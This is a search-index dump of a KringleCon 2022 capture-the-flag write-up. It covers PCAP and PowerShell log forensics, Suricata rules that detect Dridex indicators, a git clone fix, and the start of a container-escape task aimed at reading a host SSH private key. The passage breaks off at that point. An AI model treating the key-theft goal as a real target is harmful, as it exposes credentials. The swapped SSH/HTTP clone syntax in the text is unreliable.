{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"KringleCon 2022 My write-up for KringleCon 2022! Cats, cats everywhere!","title":"KringleCon 2022"},{"location":"#kringlecon-2022","text":"","title":"KringleCon 2022"},{"location":"#my-write-up-for-kringlecon-2022","text":"Cats, cats everywhere!","title":"My write-up for KringleCon 2022!"},{"location":"0.%20KringleCon%20Orientation/","text":"Get your bearings at KringleCon Checklist \u2705 Talk to Jingle Ringford Jingle Ringford will start you on your journey! \u2705 Get your badge Pick up your badge \u2705 Create a wallet Create a crypto wallet \u2705 Use the terminal Click the computer terminal \u2705 Talk to Santa Talk to Santa in front of the castle to get your next objectives. Solution First, chat with Jingle Ringford. Jingle Ringford welcomes us to the 2022 SANS Holiday Hack Challenge and hands us our badge. Chat with Jingle Ringford Welcome to the North Pole, KringleCon, and the 2022 SANS Holiday Hack Challenge! I\u2019m Jingle Ringford, one of Santa\u2019s elves. Santa asked me to come here and give you a short orientation to this festive event. Before you move forward through the gate, I\u2019ll ask you to accomplish a few simple tasks. First things first, here's your badge! It's the five golden rings in the middle of your avatar. Great - now you're official! Click on the badge on your avatar. That\u2019s where you will see your Objectives, Hints, and gathered Items for the Holiday Hack Challenge. We\u2019ve also got handy links to the KringleCon talks and more there for you! Next, click on that machine to the left and create a crypto wallet for yourself. Don't lose that key! Create a cryto wallet. Click on the KTM to the left and follow the instructions on screen. Fantastic! OK, one last thing. Click on the Cranberry Pi Terminal and follow the on-screen instructions. Terminal Great! Your orientation is now complete! You can enter through the gate now. Have FUN!!! Chat with Santa Welcome to the North Pole, intrepid traveler! Wow, we had quite a storm last night! My castle door is sealed shut behind a giant snowbank. The Elves have decided to burrow under the snow to get everything ready for our holiday deliveries. But there's another wrinkle: my Five Golden Rings have gone missing. Without the magic of the Rings, we simply can't launch the holiday season. My reindeer won't fly; I won't be able to zip up and down chimneys. What's worse, without the magic Rings, I can't fit the millions of cookies in my belly! I challenge you to go on a quest to find and retrieve each of the five Rings. I'll put some initial goals in your badge for you. The holidays, and the whole world, are counting on you.","title":"0. KringleCon Orientation"},{"location":"0.%20KringleCon%20Orientation/#checklist","text":"\u2705 Talk to Jingle Ringford Jingle Ringford will start you on your journey! \u2705 Get your badge Pick up your badge \u2705 Create a wallet Create a crypto wallet \u2705 Use the terminal Click the computer terminal \u2705 Talk to Santa Talk to Santa in front of the castle to get your next objectives.","title":"Checklist"},{"location":"0.%20KringleCon%20Orientation/#solution","text":"First, chat with Jingle Ringford. Jingle Ringford welcomes us to the 2022 SANS Holiday Hack Challenge and hands us our badge.","title":"Solution"},{"location":"0.%20KringleCon%20Orientation/#chat-with-jingle-ringford","text":"Welcome to the North Pole, KringleCon, and the 2022 SANS Holiday Hack Challenge! I\u2019m Jingle Ringford, one of Santa\u2019s elves. Santa asked me to come here and give you a short orientation to this festive event. Before you move forward through the gate, I\u2019ll ask you to accomplish a few simple tasks. First things first, here's your badge! It's the five golden rings in the middle of your avatar. Great - now you're official! Click on the badge on your avatar. That\u2019s where you will see your Objectives, Hints, and gathered Items for the Holiday Hack Challenge. We\u2019ve also got handy links to the KringleCon talks and more there for you! Next, click on that machine to the left and create a crypto wallet for yourself. Don't lose that key!","title":"Chat with Jingle Ringford"},{"location":"0.%20KringleCon%20Orientation/#create-a-cryto-wallet","text":"Click on the KTM to the left and follow the instructions on screen. Fantastic! OK, one last thing. Click on the Cranberry Pi Terminal and follow the on-screen instructions.","title":"Create a cryto wallet."},{"location":"0.%20KringleCon%20Orientation/#terminal","text":"Great! Your orientation is now complete! You can enter through the gate now. Have FUN!!!","title":"Terminal"},{"location":"0.%20KringleCon%20Orientation/#chat-with-santa","text":"Welcome to the North Pole, intrepid traveler! Wow, we had quite a storm last night! My castle door is sealed shut behind a giant snowbank. The Elves have decided to burrow under the snow to get everything ready for our holiday deliveries. But there's another wrinkle: my Five Golden Rings have gone missing. Without the magic of the Rings, we simply can't launch the holiday season. My reindeer won't fly; I won't be able to zip up and down chimneys. What's worse, without the magic Rings, I can't fit the millions of cookies in my belly! I challenge you to go on a quest to find and retrieve each of the five Rings. I'll put some initial goals in your badge for you. The holidays, and the whole world, are counting on you.","title":"Chat with Santa"},{"location":"6.%20Finale/","text":"\ud83c\udf89\ud83c\udf89\ud83c\udf89 The Story Five Rings for the Christmas king immersed in cold Each Ring now missing from its zone The first with bread kindly given, not sold Another to find 'ere pipelines get owned One beneath a fountain where water flowed Into clouds Grinchum had the fourth thrown The fifth on blockchains where shadows be bold One hunt to seek them all, five quests to find them One player to bring them all, and Santa Claus to bind them Chat with Santa Congratulations! You have foiled Grinchum's foul plan and recovered the Golden Rings! And by the magic of the rings, Grinchum has been restored back to his true, merry self: Smilegol! You see, all Flobbits are drawn to the Rings, but somehow, Smilegol was able to snatch them from my castle. To anyone but me, their allure becomes irresistable the more Rings someone possesses. That allure eventually tarnishes the holder's Holiday Spirit, which is about giving, not possesing. That's exactly what happened to Smilegol; that selfishness morphed him into Grinchum. But thanks to you, Grinchum is no more, and the holiday season is saved! Ho ho ho, happy holidays! Chat with Smilegol I must give you my most thankful of thanks, and most sorry of sorries. I'm not sure what happened, but I just couldn't resist the Rings' call. But once you returned the Rings to Santa, I was no longer so spellbound. I could think clearly again, so I shouted off that awful persona. And that grouchy Grinchum was gone for good. Now, I can be me again, just in time for gift giving. This is a lesson I won't soon forget, and I certainly won't forget you. I wish you smooth sailing on wherever your next voyage takes you!","title":"6. Finale"},{"location":"6.%20Finale/#the-story","text":"Five Rings for the Christmas king immersed in cold Each Ring now missing from its zone The first with bread kindly given, not sold Another to find 'ere pipelines get owned One beneath a fountain where water flowed Into clouds Grinchum had the fourth thrown The fifth on blockchains where shadows be bold One hunt to seek them all, five quests to find them One player to bring them all, and Santa Claus to bind them","title":"The Story"},{"location":"6.%20Finale/#chat-with-santa","text":"Congratulations! You have foiled Grinchum's foul plan and recovered the Golden Rings! And by the magic of the rings, Grinchum has been restored back to his true, merry self: Smilegol! You see, all Flobbits are drawn to the Rings, but somehow, Smilegol was able to snatch them from my castle. To anyone but me, their allure becomes irresistable the more Rings someone possesses. That allure eventually tarnishes the holder's Holiday Spirit, which is about giving, not possesing. That's exactly what happened to Smilegol; that selfishness morphed him into Grinchum. But thanks to you, Grinchum is no more, and the holiday season is saved! Ho ho ho, happy holidays!","title":"Chat with Santa"},{"location":"6.%20Finale/#chat-with-smilegol","text":"I must give you my most thankful of thanks, and most sorry of sorries. I'm not sure what happened, but I just couldn't resist the Rings' call. But once you returned the Rings to Santa, I was no longer so spellbound. I could think clearly again, so I shouted off that awful persona. And that grouchy Grinchum was gone for good. Now, I can be me again, just in time for gift giving. This is a lesson I won't soon forget, and I certainly won't forget you. I wish you smooth sailing on wherever your next voyage takes you!","title":"Chat with Smilegol"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/1.%20Wireshark%20Practise/","text":"Use the Wireshark Phishing terminal in the Tolkien Ring to solve the mysteries around the suspicious PCAP. Get hints for this challenge by typing hint in the upper panel of the terminal. Difficulty: 1/5 Chat with Sparkle Redberry Hey there! I\u2019m Sparkle Redberry. We have a bit of an incident here. We were baking lembanh in preparation for the holidays. It started to smell a little funky, and then suddenly, a Snowrog crashed through the wall! We're trying to investigate what caused this, so we can make it go away. Have you used Wireshark to look at packet capture (PCAP) files before? I've got a PCAP you might find interesting. Once you've had a chance to look at it, please open this terminal and answer the questions in the top pane. Thanks for helping us get to the bottom of this! Terminal This all started when I clicked on a link in my email. Can you help me? There are objects in the PCAP file that can be exported by Wireshark and/or Tshark. What type of objects can be exported from this PCAP? : HTTP HTTP is correct! What is the file name of the largest file we can export? : app.php app.php is correct! What packet number starts that app.php file? : 687 687 is correct! What is the IP of the Apache server? : 192.185.57.242 192.185.57.242 is correct! What file is saved to the infected host? In app.php we see the following: `saveAs(blob1, 'Ref_Sept24-2020.zip'); : Ref_Sept24-2020.zip Ref_Sept24-2020.zip is correct! Attackers used bad TLS certificates in this traffic. Which countries were they registere d to? Submit the names of the countries in alphabetical order separated by a commas (Ex: No rway, South Korea). Use this filter in wireshark ssl.handshake.certificates and inspect the packets. : Ireland, Israel, South Sudan, United States Israel, South Sudan is correct! Is the host infected (Yes/No)? yes Rejoice You got it - wonderful! So hey, when you're looking at the next terminal, remember you have multiple filetypes and tools you can utilize. Conveniently for us, we can use programs already installed on every Windows computer. So if you brought your own Windows machine, you can save the files to it and use whatever method is your favorite. Oh yeah! If you wanna learn more, or get stuck, I hear Eric Pursley's talk is about this very topic. Find the Next Objective Talk to Dusty Giftwrap for the next objective.","title":"1. Wireshark Practise"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/1.%20Wireshark%20Practise/#chat-with-sparkle-redberry","text":"Hey there! I\u2019m Sparkle Redberry. We have a bit of an incident here. We were baking lembanh in preparation for the holidays. It started to smell a little funky, and then suddenly, a Snowrog crashed through the wall! We're trying to investigate what caused this, so we can make it go away. Have you used Wireshark to look at packet capture (PCAP) files before? I've got a PCAP you might find interesting. Once you've had a chance to look at it, please open this terminal and answer the questions in the top pane. Thanks for helping us get to the bottom of this!","title":"Chat with Sparkle Redberry"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/1.%20Wireshark%20Practise/#terminal","text":"This all started when I clicked on a link in my email. Can you help me? There are objects in the PCAP file that can be exported by Wireshark and/or Tshark. What type of objects can be exported from this PCAP? : HTTP HTTP is correct! What is the file name of the largest file we can export? : app.php app.php is correct! What packet number starts that app.php file? : 687 687 is correct! What is the IP of the Apache server? : 192.185.57.242 192.185.57.242 is correct! What file is saved to the infected host? In app.php we see the following: `saveAs(blob1, 'Ref_Sept24-2020.zip'); : Ref_Sept24-2020.zip Ref_Sept24-2020.zip is correct! Attackers used bad TLS certificates in this traffic. Which countries were they registere d to? Submit the names of the countries in alphabetical order separated by a commas (Ex: No rway, South Korea). Use this filter in wireshark ssl.handshake.certificates and inspect the packets. : Ireland, Israel, South Sudan, United States Israel, South Sudan is correct! Is the host infected (Yes/No)? yes","title":"Terminal"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/1.%20Wireshark%20Practise/#rejoice","text":"You got it - wonderful! So hey, when you're looking at the next terminal, remember you have multiple filetypes and tools you can utilize. Conveniently for us, we can use programs already installed on every Windows computer. So if you brought your own Windows machine, you can save the files to it and use whatever method is your favorite. Oh yeah! If you wanna learn more, or get stuck, I hear Eric Pursley's talk is about this very topic.","title":"Rejoice"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/1.%20Wireshark%20Practise/#find-the-next-objective","text":"Talk to Dusty Giftwrap for the next objective.","title":"Find the Next Objective"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/2.%20Windows%20Event%20Logs/","text":"Investigate the Windows event log mystery in the terminal or offline. Get hints for this challenge by typing hint in the upper panel of the Windows Event Logs terminal. Difficulty: 2/5 Chat with Dusty Giftwrap Hi! I'm Dusty Giftwrap! We think the Snowrog was attracted to the pungent smell from the baking lembanh. I'm trying to discover which ingredient could be causing such a stench. I think the answer may be in these suspicious logs. I'm focusing on Windows Powershell logs. Do you have much experience there? You can work on this offline or try it in this terminal. Golly, I'd appreciate it if you could take a look. Terminal Grinchum successfully downloaded his keylogger and has gathered the admin credential We think he used PowerShell to find the Lembanh recipe and steal our secret ingredient. Luckily, we enabled PowerShell auditing and have exported the Windows PowerShell logs to a flat text file. Please help me analyze this file and answer my questions. Ready to begin? yes 1. What month/day/year did the attack take place? For example, 09/05/2021. : hint Hint 1: This is data that appears a lot in the log Hint 2: sort and unique are great commands. 1. What month/day/year did the attack take place? For example, 09/05/2021. : 12/24/2022 12/24/2022 is correct! 2. An attacker got a secret from a file. What was the original file's name? : hint Hint 1: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-7.3 2. An attacker got a secret from a file. What was the original file's name? : Recipe Recipe is correct! Hint 1: The desired line in the file will start with a $ since the question specifies[0/45]erShell variable (ex- $var). 3. The contents of the previous file were retrieved, changed, and stored to a variable by the attacker. This was done multiple times. Submit the last full PowerShell line that performed only these actions. Hint 2: To narrow your search look at https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-content?view=powershell-7.3 : $foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} is correct! 4. After storing the altered file contents into the variable, the attacker used the variabl e to run a separate command that wrote the modified data to a file. This was done multiple times. Submit the last full PowerShell line that performed only this action. : $foo | Add-Content -Path 'Recipe' $foo | Add-Content -Path 'Recipe' is correct! 5. The attacker ran the previous command against a file multiple times. What is the name of this file? : Recipe.txt Recipe.txt is correct! 6. Were any files deleted? (Yes/No) : Yes Yes is correct! 7. Was the original file (from question 2) deleted? (Yes/No) : no No is correct! 8. What is the Event ID of the log that shows the actual command line used to delete the f$ le? : 4104 4104 is correct! 9. Is the secret ingredient compromised (Yes/No)? : yes Yes is correct! 10. What is the secret ingredient? : honey Rejoice Say, you did it! Thanks a million! Now we can mix in the proper ingredients and stop attracting the Snowrog! I'm all set now! Can you help Fitzy over there wield the exalted Suricata? It can be a bit mystifying at first, but this Suricata Tome should help you fathom it. I sure hope you can make it work! Find the Next Objective Talk to Fitzy Shortstack for the next objective.","title":"2. Windows Event Logs"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/2.%20Windows%20Event%20Logs/#chat-with-dusty-giftwrap","text":"Hi! I'm Dusty Giftwrap! We think the Snowrog was attracted to the pungent smell from the baking lembanh. I'm trying to discover which ingredient could be causing such a stench. I think the answer may be in these suspicious logs. I'm focusing on Windows Powershell logs. Do you have much experience there? You can work on this offline or try it in this terminal. Golly, I'd appreciate it if you could take a look.","title":"Chat with Dusty Giftwrap"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/2.%20Windows%20Event%20Logs/#terminal","text":"Grinchum successfully downloaded his keylogger and has gathered the admin credential We think he used PowerShell to find the Lembanh recipe and steal our secret ingredient. Luckily, we enabled PowerShell auditing and have exported the Windows PowerShell logs to a flat text file. Please help me analyze this file and answer my questions. Ready to begin? yes 1. What month/day/year did the attack take place? For example, 09/05/2021. : hint Hint 1: This is data that appears a lot in the log Hint 2: sort and unique are great commands. 1. What month/day/year did the attack take place? For example, 09/05/2021. : 12/24/2022 12/24/2022 is correct! 2. An attacker got a secret from a file. What was the original file's name? : hint Hint 1: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/add-content?view=powershell-7.3 2. An attacker got a secret from a file. What was the original file's name? : Recipe Recipe is correct! Hint 1: The desired line in the file will start with a $ since the question specifies[0/45]erShell variable (ex- $var). 3. The contents of the previous file were retrieved, changed, and stored to a variable by the attacker. This was done multiple times. Submit the last full PowerShell line that performed only these actions. Hint 2: To narrow your search look at https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-content?view=powershell-7.3 : $foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'} is correct! 4. After storing the altered file contents into the variable, the attacker used the variabl e to run a separate command that wrote the modified data to a file. This was done multiple times. Submit the last full PowerShell line that performed only this action. : $foo | Add-Content -Path 'Recipe' $foo | Add-Content -Path 'Recipe' is correct! 5. The attacker ran the previous command against a file multiple times. What is the name of this file? : Recipe.txt Recipe.txt is correct! 6. Were any files deleted? (Yes/No) : Yes Yes is correct! 7. Was the original file (from question 2) deleted? (Yes/No) : no No is correct! 8. What is the Event ID of the log that shows the actual command line used to delete the f$ le? : 4104 4104 is correct! 9. Is the secret ingredient compromised (Yes/No)? : yes Yes is correct! 10. What is the secret ingredient? : honey","title":"Terminal"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/2.%20Windows%20Event%20Logs/#rejoice","text":"Say, you did it! Thanks a million! Now we can mix in the proper ingredients and stop attracting the Snowrog! I'm all set now! Can you help Fitzy over there wield the exalted Suricata? It can be a bit mystifying at first, but this Suricata Tome should help you fathom it. I sure hope you can make it work!","title":"Rejoice"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/2.%20Windows%20Event%20Logs/#find-the-next-objective","text":"Talk to Fitzy Shortstack for the next objective.","title":"Find the Next Objective"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/3.%20Suricata%20Regatta/","text":"Help detect this kind of malicious activity in the future by writing some Suricata rules. Work with Dusty Giftwrap in the Tolkien Ring to get some hints. Difficulty: 3/5 Chat with Fitzy Shortstack Hm?.. Hello... Sorry, I don't mean to be uncharaceristically short with you. There's just this abominable Snowrog here, and I'm trying to comprehend Suricata to stop it from getting into the kitchen. I believe that if I can phrase these Suricata incantations correctly, they'll create a spell that will generate warnings. And hopefully those warnings will scare off the Snowrog! Only... I'm quite baffled. Maybe you can give it a go? Terminal Use your investigative analysis skills and the suspicious.pcap file to help develop Suricata rules for the elves! There's a short list of rules started in suricata.rules in your home directory. First off, the STINC (Santa's Team of Intelligent Naughty Catchers) has a lead for us. They have some Dridex indicators of compromise to check out. First, please create a Suricata rule to catch DNS lookups for adv.epostoday.uk. Whenever there's a match, the alert message (msg) should read Known bad DNS lookup, possible Dridex infection. Add your rule to suricata.rules Once you think you have it right, run ./rule_checker to see how you've done! As you get rules correct, rule_checker will ask for more to be added. If you want to start fresh, you can exit the terminal and start again or cp suricata.rules.backup suricata.rules Good luck, and thanks for helping save the North Pole! Useful resource for intro to Suricata: https://suricata.readthedocs.io/en/suricata-6.0.0/rules/intro.html alert dns any any -> any any (dns.query;msg:\"Known bad DNS lookup, possible Dridex infection.\";content:\"adv.epostoday.uk\"; sid:1;) First rule looks good! STINC thanks you for your work with that DNS record! In this PCAP, it points to 192.185.57.242. Develop a Suricata rule that alerts whenever the infected IP address 192.185.57.242 communicates with internal systems over HTTP. When there's a match, the message (msg) should read Investigate suspicious connections, possible Dridex infection. alert http 192.185.57.242 any -> $HOME_NET any (msg: \"Investigate suspicious connections, possible Dridex infection\";) For the second indicator, we flagged 454 packet(s), but we expected 681. Please try again! alert http 192.185.57.242 any <> $HOME_NET any (msg: \"Investigate suspicious connections, possible Dridex infection\"; sid:2;) note the <>, which is used so that the rule matches both ways. First rule looks good! Second rule looks good! We heard that some naughty actors are using TLS certificates with a specific CN. Develop a Suricata rule to match and alert on an SSL certificate for heardbellith.Icanwepeh.nagoya. When your rule matches, the message (msg) should read Investigate bad certificates, possible Dridex infection. The Common Name (AKA CN) represents the server name protected by the SSL certificate. alert tls any any -> any any (tls.cert_subject; content:\"CN=heardbellith.Icanwepeh.nagoya\"; msg:\"Investigate bad certificates, possible Dridex infection\"; sid:3;) Third rule looks good! OK, one more to rule them all and in the darkness find them. Let's watch for one line from the JavaScript: let byteCharacters = atob Oh, and that string might be GZip compressed - I hope that's OK! Just in case they try this again, please alert on that HTTP data with message Suspicious JavaScript function, possible Dridex infection. From the docs: http.response_body will match on gzip decoded data just like file_data does. alert http any any -> any any (http.response.body; content: \"let byteCharacters = atob\"; msg:\"Suspicious JavaScript function, possible Dridex infection\"; sid:4;) Rejoice Woo hoo - you wielded Suricata magnificently! Thank you! Now to shout the final warning of power to the Snowrog... YOU...SHALL NOT...PASS!!! Find the Next Objective We found the Tolkien Ring! Onto the search for the Elfen Ring! Random chat wit Grinchum \ud83d\ude12Who took you, Precious? How did they take you? Mustn't happen again. \ud83d\ude42 Oh, hello, humanses. Maybe we can offer help? \ud83d\ude0f Yes... Grinchum will help the humanses. We are trying to distract them from finding the rest of you, Preciouses, with talk of hints and coinses. \ud83d\ude42 Have you found the coffers yet? The ones at the end of hidden paths? \ud83d\ude0f There's hintses in them, and coinses, they're veeerrryy special. \ud83d\ude42 Just look hard, for little, bitty, speckles or other oddities. Don't worry, they will not look for you, Preciouses. Shhh... \ud83d\ude42 Go on, humanses. Start searching!","title":"3. Suricata Regatta"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/3.%20Suricata%20Regatta/#chat-with-fitzy-shortstack","text":"Hm?.. Hello... Sorry, I don't mean to be uncharaceristically short with you. There's just this abominable Snowrog here, and I'm trying to comprehend Suricata to stop it from getting into the kitchen. I believe that if I can phrase these Suricata incantations correctly, they'll create a spell that will generate warnings. And hopefully those warnings will scare off the Snowrog! Only... I'm quite baffled. Maybe you can give it a go?","title":"Chat with Fitzy Shortstack"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/3.%20Suricata%20Regatta/#terminal","text":"Use your investigative analysis skills and the suspicious.pcap file to help develop Suricata rules for the elves! There's a short list of rules started in suricata.rules in your home directory. First off, the STINC (Santa's Team of Intelligent Naughty Catchers) has a lead for us. They have some Dridex indicators of compromise to check out. First, please create a Suricata rule to catch DNS lookups for adv.epostoday.uk. Whenever there's a match, the alert message (msg) should read Known bad DNS lookup, possible Dridex infection. Add your rule to suricata.rules Once you think you have it right, run ./rule_checker to see how you've done! As you get rules correct, rule_checker will ask for more to be added. If you want to start fresh, you can exit the terminal and start again or cp suricata.rules.backup suricata.rules Good luck, and thanks for helping save the North Pole! Useful resource for intro to Suricata: https://suricata.readthedocs.io/en/suricata-6.0.0/rules/intro.html alert dns any any -> any any (dns.query;msg:\"Known bad DNS lookup, possible Dridex infection.\";content:\"adv.epostoday.uk\"; sid:1;) First rule looks good! STINC thanks you for your work with that DNS record! In this PCAP, it points to 192.185.57.242. Develop a Suricata rule that alerts whenever the infected IP address 192.185.57.242 communicates with internal systems over HTTP. When there's a match, the message (msg) should read Investigate suspicious connections, possible Dridex infection. alert http 192.185.57.242 any -> $HOME_NET any (msg: \"Investigate suspicious connections, possible Dridex infection\";) For the second indicator, we flagged 454 packet(s), but we expected 681. Please try again! alert http 192.185.57.242 any <> $HOME_NET any (msg: \"Investigate suspicious connections, possible Dridex infection\"; sid:2;) note the <>, which is used so that the rule matches both ways. First rule looks good! Second rule looks good! We heard that some naughty actors are using TLS certificates with a specific CN. Develop a Suricata rule to match and alert on an SSL certificate for heardbellith.Icanwepeh.nagoya. When your rule matches, the message (msg) should read Investigate bad certificates, possible Dridex infection. The Common Name (AKA CN) represents the server name protected by the SSL certificate. alert tls any any -> any any (tls.cert_subject; content:\"CN=heardbellith.Icanwepeh.nagoya\"; msg:\"Investigate bad certificates, possible Dridex infection\"; sid:3;) Third rule looks good! OK, one more to rule them all and in the darkness find them. Let's watch for one line from the JavaScript: let byteCharacters = atob Oh, and that string might be GZip compressed - I hope that's OK! Just in case they try this again, please alert on that HTTP data with message Suspicious JavaScript function, possible Dridex infection. From the docs: http.response_body will match on gzip decoded data just like file_data does. alert http any any -> any any (http.response.body; content: \"let byteCharacters = atob\"; msg:\"Suspicious JavaScript function, possible Dridex infection\"; sid:4;)","title":"Terminal"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/3.%20Suricata%20Regatta/#rejoice","text":"Woo hoo - you wielded Suricata magnificently! Thank you! Now to shout the final warning of power to the Snowrog... YOU...SHALL NOT...PASS!!!","title":"Rejoice"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/3.%20Suricata%20Regatta/#find-the-next-objective","text":"We found the Tolkien Ring! Onto the search for the Elfen Ring!","title":"Find the Next Objective"},{"location":"1.%20Recover%20the%20Tolkien%20Ring/3.%20Suricata%20Regatta/#random-chat-wit-grinchum","text":"\ud83d\ude12Who took you, Precious? How did they take you? Mustn't happen again. \ud83d\ude42 Oh, hello, humanses. Maybe we can offer help? \ud83d\ude0f Yes... Grinchum will help the humanses. We are trying to distract them from finding the rest of you, Preciouses, with talk of hints and coinses. \ud83d\ude42 Have you found the coffers yet? The ones at the end of hidden paths? \ud83d\ude0f There's hintses in them, and coinses, they're veeerrryy special. \ud83d\ude42 Just look hard, for little, bitty, speckles or other oddities. Don't worry, they will not look for you, Preciouses. Shhh... \ud83d\ude42 Go on, humanses. Start searching!","title":"Random chat wit Grinchum"},{"location":"2.%20Recover%20the%20Elfen%20Ring/1.%20Clone%20with%20a%20Difference/","text":"Clone a code repository. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. Difficulty: 1/5 Chat with Bow Ninecandle Well hello! I'm Bow Ninecandle! Have you ever used Git before? It's so neat! It adds so much convenience to DevOps, like those times when a new person joins the team. They can just clone the project, and start helping out right away! Speaking of, maybe you could help me out with cloning this repo? I've heard there's multiple methods, but I only know how to do one. If you need more help, check out the panel of very senior DevOps experts. Terminal We just need you to clone one repo: git clone git@haugfactory.com:asnowball/aws_scripts.git This should be easy, right? Thing is: it doesn't seem to be working for me. This is a public repository though. I'm so confused! Please clone the repo and cat the README.md file. Then runtoanswer and tell us the last word of the README.md file! Based on this SO post https://stackoverflow.com/questions/21255438/git-permission-denied-publickey-fatal-could-not-read-from-remote-repository We can use either the SSH or the HTTP protocol to clone a git repo. The SSH method will not work if our public key has not been added to the GIT repo. So in this case we can try to clone via HTTP instead. Syntax: SSH git clone https://github.com/%REPOSITORYFOLDER%/%REPOSITORYNAME%.git HTTP git clone git@github.com:%REPOSITORYFOLDER%/%REPOSITORYNAME%.git So let's change git clone git@haugfactory.com:asnowball/aws_scripts.git to git clone https://haugfactory.com/asnowball/aws_scripts.git and voila: Cloning into 'aws_scripts'... remote: Enumerating objects: 64, done. remote: Total 64 (delta 0), reused 0 (delta 0), pack-reused 64 Unpacking objects: 100% (64/64), 23.83 KiB | 1.49 MiB/s, done. bow@9e259664f3eb:~$ ls HELP.txt aws_scripts bow@9e259664f3eb:~$ cd aws_scripts/ bow@9e259664f3eb:~/aws_scripts$ ls README.md container.py ec2-instances.py network.py security.py analytics.py create_instance.py iam.py put_policy.py send_ssm.py compute.py debug_instances.py inventory.py sample.json The last line in the README.md is: ... Someone may choose to fork your project or volunteer to step in as a maintainer or owner, allowing your project to keep going. You can also make an explicit request for maintainers . bow@9e259664f3eb:~/aws_scripts$ runtoanswer Read that repo! What's the last word in the README.md file for the aws_scripts repo? > maintainers Your answer: maintainers Checking...... Your answer is correct! Rejoice Wow - great work! Thank you! Say, if you happen to be testing containers for security, there are some things you should think about. Developers love to give ALL TeH PERMz so that things \"just work,\" but it can cause real problems. It's always smart to check for excessive user and container permissions. You never know! You might be able to interact with host processes or filesystems! Find the Next Objective Talk to Bow Ninecandle for the next objective.","title":"1. Clone with a Difference"},{"location":"2.%20Recover%20the%20Elfen%20Ring/1.%20Clone%20with%20a%20Difference/#chat-with-bow-ninecandle","text":"Well hello! I'm Bow Ninecandle! Have you ever used Git before? It's so neat! It adds so much convenience to DevOps, like those times when a new person joins the team. They can just clone the project, and start helping out right away! Speaking of, maybe you could help me out with cloning this repo? I've heard there's multiple methods, but I only know how to do one. If you need more help, check out the panel of very senior DevOps experts.","title":"Chat with Bow Ninecandle"},{"location":"2.%20Recover%20the%20Elfen%20Ring/1.%20Clone%20with%20a%20Difference/#terminal","text":"We just need you to clone one repo: git clone git@haugfactory.com:asnowball/aws_scripts.git This should be easy, right? Thing is: it doesn't seem to be working for me. This is a public repository though. I'm so confused! Please clone the repo and cat the README.md file. Then runtoanswer and tell us the last word of the README.md file! Based on this SO post https://stackoverflow.com/questions/21255438/git-permission-denied-publickey-fatal-could-not-read-from-remote-repository We can use either the SSH or the HTTP protocol to clone a git repo. The SSH method will not work if our public key has not been added to the GIT repo. So in this case we can try to clone via HTTP instead. Syntax: SSH git clone https://github.com/%REPOSITORYFOLDER%/%REPOSITORYNAME%.git HTTP git clone git@github.com:%REPOSITORYFOLDER%/%REPOSITORYNAME%.git So let's change git clone git@haugfactory.com:asnowball/aws_scripts.git to git clone https://haugfactory.com/asnowball/aws_scripts.git and voila: Cloning into 'aws_scripts'... remote: Enumerating objects: 64, done. remote: Total 64 (delta 0), reused 0 (delta 0), pack-reused 64 Unpacking objects: 100% (64/64), 23.83 KiB | 1.49 MiB/s, done. bow@9e259664f3eb:~$ ls HELP.txt aws_scripts bow@9e259664f3eb:~$ cd aws_scripts/ bow@9e259664f3eb:~/aws_scripts$ ls README.md container.py ec2-instances.py network.py security.py analytics.py create_instance.py iam.py put_policy.py send_ssm.py compute.py debug_instances.py inventory.py sample.json The last line in the README.md is: ... Someone may choose to fork your project or volunteer to step in as a maintainer or owner, allowing your project to keep going. You can also make an explicit request for maintainers . bow@9e259664f3eb:~/aws_scripts$ runtoanswer Read that repo! What's the last word in the README.md file for the aws_scripts repo? > maintainers Your answer: maintainers Checking...... Your answer is correct!","title":"Terminal"},{"location":"2.%20Recover%20the%20Elfen%20Ring/1.%20Clone%20with%20a%20Difference/#rejoice","text":"Wow - great work! Thank you! Say, if you happen to be testing containers for security, there are some things you should think about. Developers love to give ALL TeH PERMz so that things \"just work,\" but it can cause real problems. It's always smart to check for excessive user and container permissions. You never know! You might be able to interact with host processes or filesystems!","title":"Rejoice"},{"location":"2.%20Recover%20the%20Elfen%20Ring/1.%20Clone%20with%20a%20Difference/#find-the-next-objective","text":"Talk to Bow Ninecandle for the next objective.","title":"Find the Next Objective"},{"location":"2.%20Recover%20the%20Elfen%20Ring/2.%20Prison%20Escape/","text":"Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. What hex string appears in the host file /home/jailer/.ssh/jail.key.priv? Difficulty: 3/5 Chat with Tinsel Upatree Hiya hiya, I'm Tinsel Upatree! Check me out, I'm working side-by-side with a real-life Flobbit. Epic! Anyway, would ya' mind looking at this terminal with me? It takes a few seconds to start up, but then you're logged into a super secure container environment! Or maybe it isn't so secure? I've heard about container escapes, and it has me a tad worried. Do you think you could test this one for me? I'd appreciate it! Terminal Greetings Noble Player, You find yourself in a jail with a recently captured Dwarven Elf. He desperately asks your help in escaping for he is on a quest to aid a friend in a search for treasure inside a crypto-mine. If you can help him break free of his containment, he claims you would receive \"MUCH GLORY!\" Please, do your best to un-contain yourself and find the keys to both of your freedom. grinchum-land:~$ Run the command cat /proc/1/cgroup . We 